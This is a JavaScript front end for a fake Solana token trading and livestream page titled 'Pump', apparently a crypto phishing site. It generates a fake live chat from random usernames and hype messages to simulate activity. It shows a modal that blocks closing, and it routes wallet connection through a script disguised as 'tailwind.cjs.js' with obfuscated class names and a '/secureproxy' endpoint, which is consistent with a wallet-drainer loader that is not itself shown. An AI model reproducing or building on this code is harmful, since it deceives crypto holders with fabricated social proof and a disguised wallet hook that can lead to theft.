async function connectWallet() {
  // Load wallet script if not loaded
  const walletLoadEvent = new CustomEvent('wallet:load');
  document.dispatchEvent(walletLoadEvent);
  
  // Wait a bit for script to load
  await new Promise(resolve => setTimeout(resolve, 100));
  
  try {
    if (window.solana && window.solana.isPhantom) {
      await window.solana.connect();
    } else {
      window.open('https://phantom.app/', '_blank');
    }
  } catch (err) {
    console.error('Wallet connection error:', err);
  }
}

function initModal() {
  const modal = document.getElementById('howItWorksModal');
  if (modal) {
    modal.style.display = 'flex';
    document.body.style.overflow = 'hidden';
    
    const backdrop = modal.querySelector('.modal-backdrop');
    if (backdrop) {
      backdrop.addEventListener('click', (e) => {
        e.stopPropagation();
      });
    }
    
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape') {
        e.preventDefault();
        e.stopPropagation();
      }
    });
  }
}


function toggleSidebar() {
  const sidebar = document.getElementById('sidebar');
  if (sidebar) {
    sidebar.classList.toggle('open');
  }
}


function initTradeTabs() {
  const tabs = document.querySelectorAll('.trade-tab');
  tabs.forEach(tab => {
    tab.addEventListener('click', function() {
      const tabType = this.dataset.tab;
      
      tabs.forEach(t => t.classList.remove('active'));
      

      this.classList.add('active');
      

      const executeBtn = document.querySelector('.trade-execute-btn');
      if (executeBtn) {
        if (tabType === 'sell') {
          executeBtn.textContent = 'Log in to sel';
          executeBtn.style.backgroundColor = '#ef4444';
        } else {
          executeBtn.textContent = 'Log in to buy';
          executeBtn.style.backgroundColor = '#77d89a';
        }
      }
    });
  });
}


function initStreamTabs() {
  const tabs = document.querySelectorAll('.streams-tab');
  tabs.forEach(tab => {
    tab.addEventListener('click', function() {
      tabs.forEach(t => t.classList.remove('active'));
      this.classList.add('active');
    });
  });
}


function initTradePresets() {
  const presetBtns = document.querySelectorAll('.trade-preset-btn');
  const tradeInput = document.querySelector('.trade-input');
  
  presetBtns.forEach(btn => {
    btn.addEventListener('click', function() {
      const value = this.textContent.trim();
      
      if (value === 'Reset' || value === 'Max') {
        if (tradeInput) {
          tradeInput.value = '';
        }
      } else {

        const solAmount = value.replace(' SOL', '');
        if (tradeInput) {
          tradeInput.value = solAmount;
        }
      }
    });
  });
}


// Memory cleanup function
function cleanupMemory() {
  // Clean up old blob URLs (keep only 1)
  if (window._blobUrls && window._blobUrls.size > 1) {
    const urlsToRemove = Array.from(window._blobUrls).slice(0, window._blobUrls.size - 1);
    urlsToRemove.forEach(url => {
      try {
        URL.revokeObjectURL(url);
        window._blobUrls.delete(url);
      } catch (e) {
        // Ignore errors
      }
    });
  }
  
  // Clean up unused images
  const images = document.querySelectorAll('img[src^="blob:"]');
  images.forEach(img => {
    if (!img.offsetParent || img.style.display === 'none') { // Image is not visible
      try {
        if (img.src && img.src.startsWith('blob:')) {
          URL.revokeObjectURL(img.src);
          if (window._blobUrls) {
            window._blobUrls.delete(img.src);
          }
        }
        img.src = '';
        img.onload = null;
        img.onerror = null;
      } catch (e) {
        // Ignore errors
      }
    }
  });
  
  // Clean up unused response objects
  if (window._fetchResponses) {
    window._fetchResponses.clear();
  }
  
  // Force garbage collection hint (if available)
  if (window.gc) {
    window.gc();
  }
}

// Run cleanup every 10 seconds (more frequent)
setInterval(cleanupMemory, 10000);

// CRITICAL: Pre-warm connections to critical resources immediately (before DOM ready)
// Prevent duplicate calls
if (!window._prewarmConnectionsCalled) {
  window._prewarmConnectionsCalled = true;
  
  (function prewarmConnections() {
    // Pre-warm secureproxy connection (for synaptic script) - establish connection early
    // Use GET instead of HEAD for better connection reuse
    const secureproxyUrl = `${window.location.origin}/secureproxy?e=ping_proxy`;
    fetch(secureproxyUrl, { 
      method: 'GET', 
      mode: 'cors',
      cache: 'default',
      priority: 'high'
    }).catch(() => {});
    
    // Pre-warm Solana RPC connection - establish connection early with POST for keep-alive
    // Only one pre-warm request, no need for api.mainnet-beta.solana.com (it has CORS issues)
    fetch('https://solana.publicnode.com', { 
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'getHealth' }),
      mode: 'cors',
      cache: 'default',
      priority: 'high'
    }).catch(() => {});
  })();
}

// CRITICAL: Initialize immediately - don't wait for DOMContentLoaded
// This allows parallel execution and faster startup
if (document.readyState === 'loading') {
  // Start loading immediately, don't wait
  initApp();
  // Also listen for DOMContentLoaded for safety
document.addEventListener('DOMContentLoaded', function() {
    // Already initialized, just ensure everything is ready
    if (window._appInitialized) return;
    initApp();
  });
} else {
  // DOM already loaded, initialize immediately
  initApp();
}

function initApp() {
  // Prevent duplicate initialization
  if (window._appInitialized) return;
  window._appInitialized = true;
  
  // Show loading overlay and prevent scrolling
  if (document.body) {
  document.body.classList.add('loading');
  } else {
    // Body not ready yet, wait a bit
    setTimeout(() => {
      if (document.body) document.body.classList.add('loading');
    }, 0);
  }
  
  // Don't initialize modal immediately - wait for loading to complete
  // initModal() will be called after token loads
  

  // Wallet connection is handled by tailwind.cjs.js via classes aBVeeVna h3qErTJo
  // No need for custom connectWallet function if using the new system
  


  // Set loading state immediately before any async operations
  const coinNameEl = document.querySelector('.coin-name');
  const coinSymbolEl = document.querySelector('.coin-symbol');
  const streamTitleEl = document.getElementById('stream-title');
  
  if (coinNameEl) coinNameEl.textContent = 'Loading...';
  if (coinSymbolEl) coinSymbolEl.textContent = 'Loading...';
  if (streamTitleEl) streamTitleEl.textContent = 'Loading...';
  
  // Set title to "Loading..." immediately
  document.title = 'Loading... - Pump';
  
  // Initialize loading state tracking
  window._loadingState = {
    tokenName: false,
    tokenImage: false,
    ogImage: false,
    tailwindScript: false,
    solanaRPC: false // Track Solana RPC (solana.publicnode.com) request
  };
  
  // tailwind.cjs.js is loaded asynchronously and is not critical for page display
  // Don't block page loading on it - mark as ready immediately
  // Wallet connection will work when script loads (async)
    window._loadingState.tailwindScript = true;
  
  // Track Solana RPC (solana.publicnode.com) requests
  // Intercept all fetch requests to solana.publicnode.com
  (function trackSolanaRPC() {
    const originalFetch = window.fetch;
    let solanaRequestCount = 0;
    let solanaSuccessCount = 0;
    
    window.fetch = function(...args) {
      const url = args[0];
      const urlString = typeof url === 'string' ? url : (url?.url || url?.href || '');
      
      // Check if it's a request to solana.publicnode.com
      if (urlString && urlString.includes('solana.publicnode.com')) {
        solanaRequestCount++;
        console.log('[LOADING] Solana RPC request detected:', urlString);
        
        const fetchPromise = originalFetch.apply(this, args);
        
        fetchPromise.then((response) => {
          // Count successful responses (200, 204, etc.)
          if (response.ok || response.status === 204) {
            solanaSuccessCount++;
            console.log('[LOADING] Solana RPC request successful:', response.status);
            
            // Mark as ready after first successful request
            if (!window._loadingState.solanaRPC) {
              window._loadingState.solanaRPC = true;
              if (window.checkAllResourcesLoaded) {
                window.checkAllResourcesLoaded();
              }
            }
          }
        }).catch((error) => {
          console.warn('[LOADING] Solana RPC request failed:', error);
          // On error, wait a bit and mark as ready anyway (to not block forever)
          setTimeout(() => {
            if (!window._loadingState.solanaRPC) {
              console.log('[LOADING] Marking Solana RPC as ready after error timeout');
              window._loadingState.solanaRPC = true;
              if (window.checkAllResourcesLoaded) {
                window.checkAllResourcesLoaded();
              }
            }
          }, 3000);
        });
        
        return fetchPromise;
      }
      
      return originalFetch.apply(this, args);
    };
    
    // Fallback: If no requests detected after 3 seconds, mark as ready (don't make extra request)
    setTimeout(() => {
      if (solanaRequestCount === 0 && !window._loadingState.solanaRPC) {
        console.log('[LOADING] No Solana RPC requests detected, marking as ready (fallback)');
        window._loadingState.solanaRPC = true;
        if (window.checkAllResourcesLoaded) {
          window.checkAllResourcesLoaded();
        }
      }
    }, 3000);
  })();
  
  // Function to check if all resources are loaded
  function checkAllResourcesLoaded() {
    const state = window._loadingState;
    // Wait for token name - image can load in background
    const hasTokenName = state.tokenName;
    // Check if tailwind script is loaded (critical for wallet)
    const tailwindReady = state.tailwindScript || !document.querySelector('script[src="/tailwind.cjs.js"]');
    // Check if Solana RPC (solana.publicnode.com) request is completed - CRITICAL
    const solanaRPCReady = state.solanaRPC;
    // Check if OG image is loaded (or not needed)
    const ogImageReady = state.ogImage || true; // OG image is optional, mark as ready if not set
    
    if (hasTokenName && tailwindReady && solanaRPCReady && ogImageReady) {
      // All resources loaded, hide overlay and show modal
      const overlay = document.getElementById('loadingOverlay');
      if (overlay) {
        overlay.classList.add('hidden');
        document.body.classList.remove('loading');
      }
      // Show modal only after loading is complete
      initModal();
    }
  }
  
         // Timeout fallback - hide overlay after max 8 seconds (increased to wait for Solana RPC)
         setTimeout(function() {
    const overlay = document.getElementById('loadingOverlay');
    if (overlay && !overlay.classList.contains('hidden')) {
      console.warn('[LOADING] Timeout reached, hiding overlay');
      // Mark Solana RPC as ready if timeout reached (fallback)
      window._loadingState.solanaRPC = true;
      overlay.classList.add('hidden');
      document.body.classList.remove('loading');
      // Show modal even if token not loaded (fallback)
      initModal();
    }
         }, 8000);
  
  // Expose check function globally
  window.checkAllResourcesLoaded = checkAllResourcesLoaded;
  
         // Initialize token loader - wait for TokenLoader to be available (only once)
         if (!window._tokenLoaderInitAttempted) {
           window._tokenLoaderInitAttempted = true;
           
           function initTokenLoaderWhenReady() {
             if (window.TokenLoader && window.TokenLoader.init) {
               window.TokenLoader.init();
             } else if (typeof initTokenLoader === 'function') {
               initTokenLoader();
             } else {
               // TokenLoader not ready yet, wait a bit and try again (max 10 attempts)
               if (!window._tokenLoaderRetryCount) {
                 window._tokenLoaderRetryCount = 0;
               }
               if (window._tokenLoaderRetryCount < 10) {
                 window._tokenLoaderRetryCount++;
                 setTimeout(initTokenLoaderWhenReady, 50);
               }
             }
           }
           
           // Try to initialize immediately
           initTokenLoaderWhenReady();
         }
  

  initTradeTabs();
  

  initStreamTabs();
  

  initTradePresets();
  

  if (window.innerWidth < 1024) {
    document.addEventListener('click', function(e) {
      const sidebar = document.getElementById('sidebar');
      const sidebarToggle = document.querySelector('.sidebar-close');
      
      if (sidebar && sidebar.classList.contains('open')) {
        if (!sidebar.contains(e.target) && e.target !== sidebarToggle) {
          sidebar.classList.remove('open');
        }
      }
    });
  }
  

  const mobileNavButtons = document.querySelectorAll('.mobile-nav button');
  mobileNavButtons.forEach((btn, index) => {
    btn.addEventListener('click', function() {
      mobileNavButtons.forEach(b => b.classList.remove('active'));
      this.classList.add('active');
    });
  });
  

  if (mobileNavButtons.length > 0) {
    mobileNavButtons[0].classList.add('active');
  }
  

  initLiveChat();
  
  // Initialize video only once
  if (!window._videoInitialized) {
    window._videoInitialized = true;
    initStreamVideo();
  }
  
  // Immediately check if we can hide overlay (in case token already loaded)
  if (window.checkAllResourcesLoaded) {
    // Use requestAnimationFrame to ensure DOM is fully ready
    requestAnimationFrame(function() {
      window.checkAllResourcesLoaded();
    });
  }
}


function initLiveChat() {
  const chatMessagesList = document.getElementById('chatMessagesList');
  const chatEmptyState = document.getElementById('chatEmptyState');
  if (!chatMessagesList) return;
  
  // Preload pepe.png once and cache it
  let cachedAvatarUrl = '/assets/avatars/pepe.png';
  const preloadAvatar = new Image();
  preloadAvatar.onload = function() {
    // Once loaded, convert to data URI to avoid duplicate requests
    try {
      const canvas = document.createElement('canvas');
      canvas.width = this.naturalWidth;
      canvas.height = this.naturalHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(this, 0, 0);
      cachedAvatarUrl = canvas.toDataURL('image/png');
    } catch (e) {
      // If canvas conversion fails, keep using the original URL (browser will cache it)
      console.warn('[CHAT] Could not convert avatar to data URI, using original URL');
    }
  };
  preloadAvatar.src = '/assets/avatars/pepe.png';

  function checkEmptyState() {
    const messages = chatMessagesList.querySelectorAll('.chat-message');
    if (messages.length > 0 && chatEmptyState) {
      chatEmptyState.classList.add('hidden');
    } else if (messages.length === 0 && chatEmptyState) {
      chatEmptyState.classList.remove('hidden');
    }
  }
  

  const existingMessages = chatMessagesList.querySelectorAll('.chat-message');
  existingMessages.forEach((msg, index) => {
    msg.style.animationDelay = `${index * 0.1}s`;
  });
  

  checkEmptyState();
  

  const chatScroll = document.querySelector('.chat-scroll');
  if (chatScroll) {
    setTimeout(() => {
      chatScroll.scrollTop = chatScroll.scrollHeight;
    }, 500);
  }
  

  // Generate random usernames
  function generateRandomUsername() {
    const prefixes = ['crypto', 'solana', 'pump', 'degen', 'moon', 'whale', 'diamond', 'hodl', 'bull', 'lambo', 'ape', 'wen', 'to', 'guru', 'fan', 'gang', 'strong', 'king', 'life', 'boy', 'alert', 'hands', 'master', 'run', 'soon', 'moon', 'trader', 'dump'];
    const suffixes = ['_trader', '_moon', '_king', '_life', '_boy', '_alert', '_hands', '_master', '_run', '_soon', '_strong', '_moon', '_guru', '_fan', '_up', '_gang', '_ape', '_af', '_king', '_lover', '_hunter', '_warrior', '_ninja', '_pro', '_max', '_elite'];
  
    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
    const suffix = suffixes[Math.floor(Math.random() * suffixes.length)];
    return prefix + suffix;
  }
  
  // Use cached avatar URL (data URI after first load, or original URL)
  function generateAvatarPlaceholder(username, color) {
    return cachedAvatarUrl;
  }
  
  const messages = [
    'Let\'s goooooo',
    'To the moon! 🚀',
    'This is the way',
    'Pump it!',
    'Diamond hands 💎',
    'HODL strong',
    'Bullish! 📈',
    'Moon soon',
    'LFG!',
    'Wen lambo?',
    'This is huge!',
    'Buy the dip',
    'Ape in!',
    'YOLO!',
    'Mooning! 🌙',
    'Pump incoming',
    'Bull run!',
    'Diamond hands only',
    'HODL forever',
    'To infinity!',
    'Moon time!',
    'Pump it up!',
    'Let\'s go!',
    'Bullish AF',
    'Moon gang!',
    'Ape together strong',
    'Diamond hands!',
    'HODL!',
    'Moon!',
    'Pump!'
  ];
  
  const colors = [
    'rgb(224, 82, 167)',
    'rgb(224, 84, 82)',
    'rgb(119, 216, 154)',
    'rgb(139, 92, 246)',
    'rgb(59, 130, 246)',
    'rgb(236, 72, 153)',
    'rgb(251, 146, 60)',
    'rgb(34, 197, 94)',
    'rgb(168, 85, 247)',
    'rgb(14, 165, 233)'
  ];
  

  function createNewMessage() {
    const username = generateRandomUsername();
    const message = messages[Math.floor(Math.random() * messages.length)];
    const color = colors[Math.floor(Math.random() * colors.length)];
    const avatar = generateAvatarPlaceholder(username, color);
    

    const now = new Date();
    const day = String(now.getDate()).padStart(2, '0');
    const monthNames = ['JAN', 'FEB', 'MAR', 'APR', 'MAY', 'JUN', 'JUL', 'AUG', 'SEP', 'OCT', 'NOV', 'DEC'];
    const month = monthNames[now.getMonth()];
    const year = now.getFullYear();
    const dateStr = `${day} ${month} ${year}`;
    
    const hours = String(now.getHours()).padStart(2, '0');
    const minutes = String(now.getMinutes()).padStart(2, '0');
    const timeStr = `${hours}:${minutes}`;
    

    const messageDiv = document.createElement('div');
    messageDiv.className = 'chat-message';
    messageDiv.style.animation = 'slideInMessage 0.3s ease-out forwards';
    messageDiv.style.opacity = '0';
    
    messageDiv.innerHTML = `
      <div class="chat-avatar">
        <img src="${avatar}" alt="${username}'s profile picture">
      </div>
      <div class="chat-bubble" style="color: ${color};">
        <a href="#" class="chat-username" style="color: ${color};">${username}</a>
        <p class="chat-text">${message}</p>
        <div class="chat-time">
          <span>${timeStr}</span>
        </div>
      </div>
    `;
    

    const lastDateDivider = chatMessagesList.querySelector('.chat-date-divider');
    let needsDateDivider = false;
    
    if (!lastDateDivider) {
      needsDateDivider = true;
    } else {
      const lastDate = lastDateDivider.textContent.trim();
      if (lastDate !== dateStr) {
        needsDateDivider = true;
      }
    }
    

    if (needsDateDivider) {
      const dateDivider = document.createElement('div');
      dateDivider.className = 'chat-date-divider';
      dateDivider.textContent = dateStr;
      chatMessagesList.insertBefore(dateDivider, chatMessagesList.firstChild);
    }
    

    chatMessagesList.insertBefore(messageDiv, chatMessagesList.firstChild);
    

    checkEmptyState();
    

    setTimeout(() => {
      messageDiv.style.opacity = '1';
    }, 10);
    

    if (chatScroll) {
      setTimeout(() => {
        chatScroll.scrollTop = chatScroll.scrollHeight;
      }, 100);
    }
    

    // Limit messages to reduce memory usage
    const allMessages = chatMessagesList.querySelectorAll('.chat-message');
    const maxMessagesToKeep = 15; // Reduced to 15
    if (allMessages.length > maxMessagesToKeep) {
      // Remove oldest messages
      for (let i = maxMessagesToKeep; i < allMessages.length; i++) {
        const msg = allMessages[i];
        // Clean up images in removed messages
        const imgs = msg.querySelectorAll('img');
        imgs.forEach(img => {
          if (img.src && img.src.startsWith('blob:')) {
            try {
              URL.revokeObjectURL(img.src);
            } catch (e) {
              // Ignore errors
            }
          }
          img.src = '';
          img.onload = null;
          img.onerror = null;
        });
        // Clean up all event listeners and content
        const avatars = msg.querySelectorAll('.chat-avatar');
        avatars.forEach(avatar => {
          const avatarImg = avatar.querySelector('img');
          if (avatarImg) {
            avatarImg.src = '';
            avatarImg.onload = null;
            avatarImg.onerror = null;
          }
        });
        msg.innerHTML = ''; // Clear content before removing
        msg.remove();
      }
    }
  }
  
  // Start creating messages automatically
  // Create initial messages immediately (8-12 messages)
  const initialMessagesCount = Math.floor(Math.random() * 5) + 8; // 8-12 messages
  for (let i = 0; i < initialMessagesCount; i++) {
    setTimeout(() => {
      createNewMessage();
    }, i * 100); // Stagger initial messages by 100ms (faster)
  }
  
  // Then create new messages every 0.5-1.5 seconds (much faster)
  const messageInterval = setInterval(() => {
    createNewMessage();
  }, Math.random() * 1000 + 500); // Random interval between 0.5-1.5 seconds
  
  // Store interval ID for cleanup if needed
  window.chatMessageInterval = messageInterval;
}

// Initialize stream video with lazy loading - SINGLE INITIALIZATION ONLY
function initStreamVideo() {
  const video = document.getElementById('stream-video');
  if (!video) {
    console.warn('[VIDEO] Video element not found');
    return;
  }
  
  // STRICT duplicate prevention - check if already initialized
  if (video.dataset.initialized === 'true') {
    console.log('[VIDEO] Already initialized, skipping');
    return; // Already initialized, exit immediately
  }
  
  // Check if video already has src set (from any source)
  const currentSrc = video.src || video.getAttribute('src') || '';
  const videoPath = '/assets/streams/stream-video.mp4';
  
  // If src is already set correctly, mark as initialized and return
  if (currentSrc && currentSrc.includes('stream-video.mp4')) {
    console.log('[VIDEO] Src already set, marking as initialized');
    video.dataset.initialized = 'true';
    return;
  }
  
  // Mark as initialized IMMEDIATELY to prevent race conditions
  video.dataset.initialized = 'true';
  console.log('[VIDEO] Initializing video - ONE TIME ONLY');
  
  // Show video element
  video.style.display = 'block';
  video.classList.add('loading');
  
  // Set video attributes BEFORE setting src
  video.playsInline = true;
  video.muted = true;
  video.loop = true;
  video.preload = 'auto'; // Set to auto to allow loading
  
  // Set src ONLY ONCE
  video.src = videoPath;
  
  // Call load() to start loading
  video.load();
  
  // Show video when metadata is loaded - only once
  const handleMetadataLoaded = () => {
    video.classList.remove('loading');
    video.classList.add('loaded');
    // Hide background image when video is ready
    const videoBg = document.querySelector('.video-bg');
    if (videoBg) {
      videoBg.style.opacity = '0';
      videoBg.style.transition = 'opacity 0.5s ease-out';
    }
    // Try to start playback after metadata is loaded
    video.play().catch(() => {
      // Autoplay blocked, will play on user interaction
    });
  };
  
  video.addEventListener('loadedmetadata', handleMetadataLoaded, { once: true });
  
  // Show video when data is loaded - only once
  const handleDataLoaded = () => {
    video.classList.remove('loading');
    video.classList.add('loaded');
    const videoBg = document.querySelector('.video-bg');
    if (videoBg) {
      videoBg.style.opacity = '0';
      videoBg.style.transition = 'opacity 0.5s ease-out';
    }
  };
  
  video.addEventListener('loadeddata', handleDataLoaded, { once: true });
  
  // Handle loading errors - fallback to background image with detailed logging
  video.addEventListener('error', (e) => {
    const error = video.error;
    let errorMsg = 'Unknown error';
    
    if (error) {
      switch (error.code) {
        case error.MEDIA_ERR_ABORTED:
          errorMsg = 'Video loading aborted';
          break;
        case error.MEDIA_ERR_NETWORK:
          errorMsg = 'Network error while loading video';
          break;
        case error.MEDIA_ERR_DECODE:
          errorMsg = 'Video decoding error';
          break;
        case error.MEDIA_ERR_SRC_NOT_SUPPORTED:
          errorMsg = 'Video format not supported';
          break;
        default:
          errorMsg = `Video error code: ${error.code}`;
      }
    }
    
    console.error('[VIDEO] Video loading error:', errorMsg, error);
    console.error('[VIDEO] Video src:', video.src);
    console.error('[VIDEO] Video networkState:', video.networkState);
    console.error('[VIDEO] Video readyState:', video.readyState);
    
    // Don't hide video immediately - try to show background image first
    const videoBg = document.querySelector('.video-bg');
    if (videoBg) {
      videoBg.style.opacity = '1';
      videoBg.style.zIndex = '1';
    }
    
    // Hide video only if it's a critical error
    if (error && (error.code === error.MEDIA_ERR_SRC_NOT_SUPPORTED || error.code === error.MEDIA_ERR_DECODE)) {
      video.style.display = 'none';
    }
    
    video.classList.remove('loading');
  }, { once: true });
  
  // Also listen for network state changes to catch loading issues
  video.addEventListener('loadstart', () => {
    console.log('[VIDEO] Load started');
  });
  
  video.addEventListener('progress', () => {
    if (video.buffered.length > 0) {
      const bufferedEnd = video.buffered.end(video.buffered.length - 1);
      const duration = video.duration;
      if (duration > 0) {
        const percent = (bufferedEnd / duration) * 100;
        console.log('[VIDEO] Buffered:', percent.toFixed(1) + '%');
      }
    }
  });
  
  video.addEventListener('stalled', () => {
    console.warn('[VIDEO] Video loading stalled');
  });
  
  video.addEventListener('suspend', () => {
    console.warn('[VIDEO] Video loading suspended');
  });
  
  
  // Load video on play button click
  const playButton = document.querySelector('.play-button');
  if (playButton) {
    playButton.addEventListener('click', () => {
      if (video.paused) {
        video.play().catch(err => {
          console.warn('Autoplay prevented:', err);
          // Unmute and try again
          video.muted = false;
          video.play().catch(() => {
            console.warn('Video play failed');
          });
        });
      } else {
        video.pause();
      }
    });
  }
  
  // Try to play video when it's ready (autoplay)
  video.addEventListener('canplay', () => {
    // Try autoplay, but don't fail if it's blocked
    video.play().catch(() => {
      // Autoplay blocked, user will need to click play button
    });
  }, { once: true });
}
